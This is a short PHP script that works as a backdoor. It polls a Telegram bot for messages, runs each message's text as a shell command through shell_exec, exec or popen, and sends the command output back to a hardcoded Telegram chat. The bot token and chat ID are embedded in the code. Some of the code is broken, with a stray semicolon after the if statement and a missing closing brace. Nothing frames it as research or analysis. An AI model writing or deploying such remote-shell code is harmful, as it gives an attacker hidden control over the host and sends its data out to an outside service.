<?php
function readMessage($token,$offset)
{
    try
    {
        $r = file_get_contents("https://api.telegram.org/bot$token/getUpdates?offset=$offset");
		$m = json_decode($r, true);
		$c=$m['result'][count($m['result'])-1];
		$message = $c['message']['text'];
		$offset = $c['update_id'];
		return [$offset,$message];

		#$message = $c['message']['text'];
		#return $message;
    }
    catch (exception $e)
    {
        return 'test';
    }
}



function cmd($command)
{
    try
    {
        return shell_exec($command);
    }
    catch(exception $e)
    {
        try
        {
            $output=null;
            exec('ipconfig', $output);
            $out = '';
            foreach ($output as $i)
            {
                $out = "$out\n$i";
            }
            return $out;
        }
        catch(exception $e)
        {
            pclose(popen("start /B $command > outphp.txt", "r"));
            return file_get_contents('outphp.txt');
        }

    }
}

function sendMessage($token,$chat_id,$message)
{
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id+&text=$message";
    return file_get_contents($url);
}

function start($token,$chat_id)
{
    $offset = readMessage($token,'0')[0];
    $ffo = ' ';
    while(TRUE)
    {
        $m = readMessage($token,$offset);
        $c = $m [1];
        $offset = $m[0];
        if ($ffo < $offset);
        {
            $ffo = $offset;
			echo $ffo;
			echo $offset;
			echo gettype($ffo);
			echo gettype($offset);
            sendMessage($token,$chat_id,cmd($c));
        
        }
		
}
start('5424626039:AAHFuTTwIoIQI8I-3hgPvg8vE5_gFTtLmRI','-1001550861772');
?>
